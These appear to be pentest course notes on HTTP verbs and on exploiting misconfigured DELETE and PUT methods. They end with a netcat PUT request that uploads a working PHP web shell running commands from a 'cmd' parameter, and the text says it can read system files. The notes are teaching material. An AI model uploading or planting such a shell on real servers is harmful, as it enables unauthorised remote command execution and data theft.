# HTTP Verbs

## HTTP Verbs

### **GET**

* Used to request a resource.

```
GET /page.php HTTP/1.1
Host: www.example.site
```

* Can pass arguments. To pass "course=PTS" to page.php, the request will be:

```
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site
```

### **POST**

* Used to submit HTML form data
* Parameters must be in the **message body**

```
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass
```

### **HEAD**

* Asks just headers of the response instead of the response body

```
HEAD / HTTP/1.1
Host: www.example.site
```

### **PUT**

* Used to **upload** a file to the server
* very dangerous if it is allowed and misconfigured

```
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT data>
```

### **DELETE**

* Used to remove a file from the server
* must be configured wisely as a misused DELETE leads to DOS and data loss

```
DELETE /path/to/destination HTTP/1.1
Host: www.example.site
```

### **OPTIONS**

* Used to query the web server for enabled HTTP Verbs

```
OPTIONS / HTTP/1.1
Host: www.example.site
```

#### Rest APIs

* Represenbtational State Transfer Applicatoin Programming INterface
* Specific type of web app that reslies strongly on almosdt all HTTP verbs
* Common for these apps to use "PUT" for saving data/creating new content and not for saving files
* During a pentest, confirm impact of "PUT/DELETE" method twice before reporting it found
  * After issuing a PUT request, try to look for the existence of the file you created

## Using HTTP 1.0 Syntax

* Using HTTP 1.1 implies also sending a `Host:` header in the request.
* If you use HTTP 1.0, you can skip it

## Exploiting Misconfigured HTTP Verbs

### Enumeration with OPTIONS

* enumerate available methods or verbs

![](<../../../../.gitbook/assets/image (1) (1) (1) (1).png>)

### Exploiting DELETE

![](<../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1).png>)

![Logging in becomes impossible for every user](<../../../../.gitbook/assets/image (1) (1) (1).png>)

### Exploiting PUT

* you have to know the size of the file you want to upload on the server

![](<../../../../.gitbook/assets/image (10) (1) (1) (1) (1).png>)

* You can then use the size you got to build the PUT message
  * Example: Upload a page displaying info about the PHP installation on a server

![](<../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)

### Uploading a PHP Shell with PUT

![](<../../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png>)

* This can be used by passing our commands via the cmd GET parameter

![](<../../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1).png>)

* The shell has the same permissions of the web server it runs on.
* For example, we can write a file

![](<../../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png>)

* We can also read it

![](<../../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png>)

* And we can even read a system file

![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1).png>)

{% hint style="warning" %}
Remember that PUT requires that we pass the content length. So we have to know the shell size
{% endhint %}

![](<../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png>)

* We can then build a valid PUT request

```bash
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

<?php
if (isset($_GET['cmd']))
{
        $cmd = $_GET['cmd'];
        echo '<pre>';
        $result = shell_exec($cmd);
        echo $result;
        echo '</pre>';
}
?>
```
